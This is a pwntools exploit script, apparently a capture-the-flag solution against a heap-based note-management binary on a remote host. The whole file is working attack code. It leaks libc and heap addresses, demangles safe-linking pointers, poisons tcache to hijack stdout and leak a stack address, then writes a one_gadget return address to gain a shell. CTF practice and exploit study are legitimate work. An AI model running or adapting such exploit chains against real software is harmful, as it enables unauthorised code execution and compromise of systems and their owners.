#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './prob_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '43.203.168.199', 13379

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# load's return
# breakrva 0x215b

# edit's return
# breakrva 0x1974
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
complete_no = 0

def create(idx, title, desc):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b':', title)
    io.sendafter(b':', desc)

def edit(idx, desc):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b'Desc :', desc)

def read(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def complete(idx):
    global complete_no
    no = complete_no
    complete_no += 1
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b':', str(idx).encode())
    log.info("complete %d", no)
    return no

def load(no, idx):
    io.sendlineafter(b'>', b'5')
    io.sendlineafter(b':', str(no).encode())
    io.sendlineafter(b':', str(idx).encode())

def delete(idx):
    io.sendlineafter(b'>', b'6')
    io.sendlineafter(b':', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    title = b'0||'+b'A'*(0xf-3)
    create(0, title, cyclic(10) + p64(0x441))
    unsorted_size = complete(0)

    create(1, b'0', b'0')
    create(3, b'0', b'0')
    create(6, b'0', b'0')
    create(7, b'0', b'0')
    for _ in range(40-1):
        create(2, b'0', b'0')

    load(unsorted_size, 0)
    delete(1)
    delete(0)

    create(2, title, cyclic(10))
    read(3)
    io.recvuntil(b'Desc : ')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x203b20
    stdout = libc.sym['_IO_2_1_stdout_']

    create(4, b'0', b'0')
    create(1, b'0', b'0')
    create(5, b'0', b'0')
    delete(3)

    read(4)
    io.recvuntil(b'Desc : ')
    heap = demangle(u64(io.recv(6).ljust(8, b'\x00'))) - 0x2c0

    # clear bins
    for _ in range(40-1):
        create(2, b'0', b'0')
    create(2, b'asd', b'asd')
    consume_tcache = complete(2)
    load(consume_tcache, 2)
    load(consume_tcache, 2)
    load(consume_tcache, 2)

    # at this point, duplicate ptrs
    # 3 -> 4 (used)
    # 6 -> 1
    # 7 -> 5
    
    create(0, b'asd', b'asd')
    delete(0)
    delete(6)
    edit(1, p64(mangle(heap, stdout)))

    create(0, b'asd', b'\x00')
    stdout1 = complete(0)
    load(stdout1, 0)
    load(stdout1, 0)
    load(stdout1, 0)
    edit(0, flat([
        0xFBAD1800,
        0x0,
        0x0
    ]))

    create(0, b'asd', b'asd')
    delete(0)
    delete(7)
    edit(5, p64(mangle(heap, stdout+0x20)))

    create(0, b'asd', b'\x00')
    stdout2 = complete(0)
    load(stdout2, 0)
    load(stdout2, 0)
    load(stdout2, 0)
    edit(0, flat([
        libc.sym['environ'],
        libc.sym['environ']+0x10,
        libc.sym['environ']+0x10
    ]))

    io.recv(1)
    stack = u64(io.recv(6).ljust(8, b'\x00'))
    rip = stack - 0x150

    # ==============================================
    create(0, title, cyclic(10) + p64(0x441))
    create(1, b'0', b'0')
    create(3, b'0', b'0')
    create(7, b'0', b'0')
    create(7, b'0', b'0')
    create(7, b'0', b'0')
    for _ in range(40-1):
        create(2, b'0', b'0')
    delete(0)
    load(unsorted_size, 0)
    delete(1)

    create(0, b'asd', b'asd')
    create(1, b'asd', b'asd')
    delete(0)
    delete(1)
    edit(3, p64(mangle(heap, stack-0xe0-0x8)))

    one_gadgets = [0x583ec, 0x583f3, 0xef4ce, 0xef52b, 0x1111b7]
    create(0, b'asd', flat([
        u64(b'A'*8), # rbp
        0x0,
    ]))
    rop = complete(0)
    load(rop, 0)
    load(rop, 0)
    load(rop, 0)

    create(0, b'asd', b'asd')
    create(1, b'asd', b'asd')
    delete(0)
    delete(1)
    edit(7, p64(mangle(heap, rip-0x8)))
    
    create(0, b'asd', flat([
        u64(b'A'*8), # rbp
        libc.address + one_gadgets[4],
    ]))
    # pause()
    rop = complete(0)
    load(rop, 0)
    load(rop, 0)
    load(rop, 0)

    log.info("heap: %#x", heap)
    log.info("libc base: %#x", libc.address)
    log.info("environ: %#x", libc.sym['environ'])
    log.info("stack: %#x", stack)
    log.info("rip: %#x", rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
